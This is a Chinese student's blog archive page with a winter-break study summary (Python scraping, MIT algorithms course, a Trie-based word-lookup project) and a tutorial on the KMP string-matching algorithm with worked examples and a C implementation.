<h2 id="Python爬虫入门"><a href="#Python爬虫入门" class="headerlink" title="Python爬虫入门"></a>Python爬虫入门</h2><p>参考书是《Python网络数据解析》，目前看到了第三章，主要接触了urlopen以及BeautifulSoup库以及最基本的爬虫思想，原书第三章的最后也简单的提到了爬虫用的Scrapy框架。</p>
<p>学习时候练习的代码托管在我的<a href="https://github.com/BlackDragonF/PythonScrapingLearning" target="_blank" rel="noopener">Github</a>上。</p>
<h2 id="MIT的算法导论公开课"><a href="#MIT的算法导论公开课" class="headerlink" title="MIT的算法导论公开课"></a>MIT的算法导论公开课</h2><p>目前看到了“快速排序以及随机化算法”这一节，但是对于之前所重点介绍的分治法的主定理仍然有不清楚的地方，需要花时间巩固学习并且配合LeetCode一起食用。</p>
<h2 id="数据结构课程设计"><a href="#数据结构课程设计" class="headerlink" title="数据结构课程设计"></a>数据结构课程设计</h2><p>因为其他事情的原因，我选的是最简单的第三题“基于查找表的单词检索软件”，但是我并没有使用二叉搜索树而是使用了Trie树来实现动态查找表。</p>
<p>抱着既然要做课设就不要糊弄的想法，这次的课设还是浪费了自己不少时间，在完成了最基本的Trie树以及Hash表之后，自己又实现了Hash表的迭代器以及Hash表的序列化，了解到了C语言中命令行参数的处理 - getopt。虽然程序仍然有大量可以优化和改进的地方，但是考虑到今年寒假投入的时间不是特别多，我总体上来说还是很满意的。</p>
<hr>
<blockquote>
<p>虽然说了不立Flag，写寒假总结督促自己，但是实际上今年寒假还是有各种堕怠，想要做的事情还是有很多没做，想想还是有点遗憾，但毕竟还是比大二上和去年寒假要好很多了。</p>
</blockquote>
<hr>
<blockquote>
<p>关于输入和输出：仅对于自己而言，我认为输入和输出都是必要的，如果只强调输入，而忽视输出，那么只知道知识本身而不会运用知识，于我而言会失去学习的兴趣，更何况在大多数时候，缺乏一定数量的练习的我们甚至还没有能真正的掌握知识；而如果是以为的强调输出，那么可能和大一的我一样，只能成为为一个劣质的API Caller而已。</p>
</blockquote>
<hr>
<blockquote>
<p>想到了去年团队总结说过的话，同样送给今天的自己：身为一个本科生，在扎实自己计算机基础的同时我也愿意更多的接触不同的方向比如iOS，Web的前端、后台技术甚至是一些设计的规范(世界这么大，我想去看看)。未来自己还要更加努力才行啊(毕竟现在的基础还是很弱)。<br></p>
</blockquote>
<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>大二上因为种种原因而陷入了迷茫，加权没有刷上来，在自己想学的东西上也几乎没有花什么时间，一直在懒懒散散地混日子，生活更是一团糟，但是好在并没有做出让自己后悔的事。</p>
<p>寒假刚开始的时候想了很多，虽然前路漫漫，伤痛注定多余喜悦，但我也决定不再逃避过去的自己，正视现在的自己。假期的时候和很多曾经的同学交流过人生和发展，也终于鼓起勇气认识了更多的人，看到了更多不一样的人生。然后这样的自己，突然又获得了梦想。</p>
<p>每一个不曾起舞的日子都是对生命的辜负，以上。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/02/12/寒假总结/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/01/12/KMP-Knuth-Morris-Pratt-算法/">
                            KMP(Knuth-Morris-Pratt)算法
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-01-12T12:14:58+08:00">
	
		    1月 12, 2017
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>KMP算法是著名并且高效的字符串匹配算法，该算法因Knuth，Morris与Pratt三人联合发表而得名。</p>
</blockquote>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>给定两个字符串S(n个字符)和W(m个字符)，求W在S中第一次出现的位置。</p>
<h2 id="BF-Brute-Force-算法"><a href="#BF-Brute-Force-算法" class="headerlink" title="BF(Brute Force)算法"></a>BF(Brute Force)算法</h2><p>BF算法是普通的模式匹配的算法，该算法的思想是首先比较S和W的第一个字符，若匹配，则继续比较下一个字符，若不匹配，则从S的第二个字符和W的第一个字符开始，重复上述过程，直到S和W匹配。</p>
<p>该算法的时间复杂度为 <strong>O(m*n)</strong></p>
<h2 id="KMP-Knuth-Morris-Pratt-算法"><a href="#KMP-Knuth-Morris-Pratt-算法" class="headerlink" title="KMP(Knuth-Morris-Pratt)算法"></a>KMP(Knuth-Morris-Pratt)算法</h2><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><p>在BF算法中，如果发生字符串失配，那么我们会从S的下一个字符开始<strong>重头</strong>开始匹配，而实际上，在发生失配时，W自身已经包含了足够的信息，以确定下一个匹配的位置，这就是KMP算法的核心思路。</p>
<h3 id="算法实例"><a href="#算法实例" class="headerlink" title="算法实例"></a>算法实例</h3><p>不妨设字符串S为 <strong>ABC ABCDAB ABCDABCDABDE</strong>，W为 <strong>ABCDABD</strong>。</p>
<p>首先我们从W和S的开头开始匹配，但是我们发现，S[3] = ‘ ‘而W[3] = ‘D’，发生了失配，但我们同时也发现，S[1]到S[3]不与W[0]——也就是’A’相匹配，因此下一次匹配我们直接从S[4]开始，与W[0]进行匹配。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W: ABCDABD</span><br><span class="line">      |</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">       |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:     ABCDABD</span><br><span class="line">       |</span><br></pre></td></tr></table></figure>
<p>随后，我们发现S[10] = ‘ ‘与W[6] = ‘D’失配，注意到W[0]-W[1]与W[4]-W[5]均为”AB”，因此下一次匹配时，我们也不必直接从下一位开始匹配，而是可以从已匹配的尾部的”AB”处继续匹配。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">             |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:     ABCDABD</span><br><span class="line">             |</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">             |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:         ABCDABD</span><br><span class="line">             |</span><br></pre></td></tr></table></figure>
<p>下图所示的情况与上述的情况类似，我们直接从尾部的”AB”处继续匹配。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:            ABCDABD</span><br><span class="line">                    |</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:                ABCDABD</span><br><span class="line">                    |</span><br></pre></td></tr></table></figure>
<p>最终找出了完全匹配的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                        |</span><br><span class="line">S: ABC ABCDAB ABCDABCDABDE</span><br><span class="line">W:                ABCDABD</span><br><span class="line">                        |</span><br></pre></td></tr></table></figure>
<h3 id="部分匹配表（失配函数）"><a href="#部分匹配表（失配函数）" class="headerlink" title="部分匹配表（失配函数）"></a>部分匹配表（失配函数）</h3><p>部分匹配表中的部分匹配值指出了在发生失配时，可以跳过的无效字符数。</p>
<p>我们首先需要了解两个概念：“前缀”和“后缀”。</p>
<p>“前缀”指除了最后一个字符之外，一个字符串的全部头部组合；“后缀”指除了第一个字符之外，一个字符串的全部尾部组合。</p>
<p>部分匹配值就是“前缀”和“后缀”的最长的共有元素的长度。</p>
<p>部分匹配值的实质是，有时候，字符串的头部和尾部会有重复。这样，不能直接将字符串向后移动“字符串长度”位，而是应该移动“字符串长度-部分匹配值”位。</p>
<h4 id="部分匹配表实例"><a href="#部分匹配表实例" class="headerlink" title="部分匹配表实例"></a>部分匹配表实例</h4><p>以”ABCDABD”为例——</p>
<ul>
<li>“A”的前缀和后缀都为{}，共有元素长度为0；</li>
<li>“AB”的前缀为{“A”}，后缀为{“B”}，共有元素长度为0；</li>
<li>“ABC”的前缀为{“A”, “AB”}，后缀为{“C”, “BC”}，共有元素长度为0；</li>
<li>“ABCD”的前缀为{“A”, “AB”, “ABC”}，后缀为{“D”, “CD”, “BCD”}，共有元素长度为0；</li>
<li>“ABCDA”的前缀为{“A”, “AB”, “ABC”, “ABCD”}，后缀为{“A”, “DA”, “CDA”, “BCDA”}，共有元素为{“A”}，长度为1；</li>
<li>“ABCDAB”的前缀为{“A”, “AB”, “ABC”, “ABCD”, “ABCDA”}，后缀为{“B”, “AB”, “DAB”, “CDAB”, “BCDAB”}，共有元素为{“AB”}，长度为2；</li>
<li>“ABCDABD”的前缀为{“A”, “AB”, “ABC”, “ABCD”, “ABCDA”, “ABCDAB”}，后缀为{“D”, “BD”, “ABD”, “DABD”, “CDABD”, “BCDABD”}，共有元素长度为0；</li>
</ul>
<h3 id="算法实现（C语言）"><a href="#算法实现（C语言）" class="headerlink" title="算法实现（C语言）"></a>算法实现（C语言）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> <span class="keyword">char</span> * w)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> w_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> s_len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> w_len = <span class="built_in">strlen</span>(w);</span><br><span class="line">    <span class="keyword">int</span> next[w_len];</span><br><span class="line">    generate_next(w, next);</span><br><span class="line">    <span class="keyword">while</span> (s_idx &lt; s_len &amp;&amp; w_idx &lt; w_len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (w_idx == <span class="number">-1</span> || s[s_idx] == w[w_idx]) &#123;</span><br><span class="line">            s_idx++;</span><br><span class="line">            w_idx++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             w_idx = next[w_idx];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (w_idx == w_len) &#123;</span><br><span class="line">         <span class="keyword">return</span> (s_idx - w_idx);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate_next</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * w, <span class="keyword">int</span> * next)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> index = <span class="number">0</span>, k = <span class="number">-1</span>;</span><br><span class="line">     <span class="keyword">int</span> w_len = <span class="built_in">strlen</span>(w);</span><br><span class="line">     next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">     <span class="keyword">while</span> (index &lt; w_len <span class="number">-1</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (k == <span class="number">-1</span> || w[index] == w[k]) &#123;</span><br><span class="line">             ++k;</span><br><span class="line">             ++index;</span><br><span class="line">             next[index] = k;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             k = next[k];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>注意到这里我们对于部分匹配表做了一些额外的处理，我们将部分匹配表的值向右移动了一位，并且将部分匹配表的第一个值置为了-1。</p>
<p>这是因为字符串w的第一个字符串的特殊性决定的，因为w字符的第一个字符串失配后无法回退，只能从s字符串的下一个字符开始匹配。</p>
<p>此外，在求解next数组的函数generate_next中还有一句k=next[k]，这实际上是字符串的自我匹配的过程，当0–k-1发生失配时，应当找到一个满足条件的j，从0–j-1之后继续匹配，直到找不到更小的字符串为止。</p>
<h3 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h3><p><strong>O(m+n)</strong></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.csdn.net/v_july_v/article/details/7041827" target="_blank" rel="noopener">从头到尾彻底理解KMP</a></p>
<p><a href="http://www.cnblogs.com/c-cloud/p/3224788.html" target="_blank" rel="noopener">【经典算法】——KMP，深入讲解next数组的求解</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E5%8A%AA%E6%96%AF-%E8%8E%AB%E9%87%8C%E6%96%AF-%E6%99%AE%E6%8B%89%E7%89%B9%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">克努斯-莫里斯-普拉特算法</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote>
<p>一直不能够深刻地理解KMP算法，即使是写完了这篇Blog，我仍然对于KMP算法有着有限的了解，所以不排除这篇Blog还会有后续的可能。</p>
</blockquote>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/01/12/KMP-Knuth-Morris-Pratt-算法/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
          <li class="pagination-prev">
            <a class="btn btn--default btn--small" href="/archives/2017/">
              <i class="fa fa-angle-left text-base icon-mr"></i>
              <span>上一页</span>
            </a>
          </li>
        
        
        <li class="pagination-number">第 2 页 共 2 页</li>
    </ul>
</div>

</section>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2018 码龙黑曜. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">码龙黑曜</h4>
        
            <div id="about-card-bio"><p>iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>华中科技大学 本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                Wuhan, China
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-feiabjni254mgbxiozwsjblcsiodjqohurk0dcfkq0aooroewq6bvkdnadrg.min.js"></script>
<!--SCRIPTS END-->



    </body>
</html>
